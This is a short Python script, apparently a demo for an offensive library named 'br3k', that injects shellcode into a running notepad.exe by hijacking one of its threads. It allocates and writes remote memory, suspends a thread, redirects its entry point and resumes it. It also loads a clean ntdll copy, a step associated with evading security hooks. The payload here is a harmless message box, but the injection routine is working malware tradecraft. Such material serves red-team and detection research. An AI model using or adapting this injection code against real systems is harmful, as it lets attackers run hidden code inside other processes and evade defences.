import br3k
from br3k import ProcessOpenMethod, ProcessMemoryStrategy

if __name__ == "__main__":

    print("Script: Inject via hijack remote thread")
    print()

    br3k.init_sysapi(ntdll_copy=True)

    shellcode = br3k.shellcode_get_messageboxw()

    process = br3k.Process(
        name="notepad.exe",
        memory_strategy=ProcessMemoryStrategy.AllocateInAddr,
        open_method=ProcessOpenMethod.OpenProcess
    )

    process.open()
    process.init_memory()
    process.create_memory(size=len(shellcode))
    ep = process.get_memory_remote_address()

    process.write_memory(data=shellcode)

    process.open_any_thread()
    process.suspend_thread()
    process.set_thread_ep(new_thread=False, ep=ep)
    process.resume_thread()

    br3k.script_success()
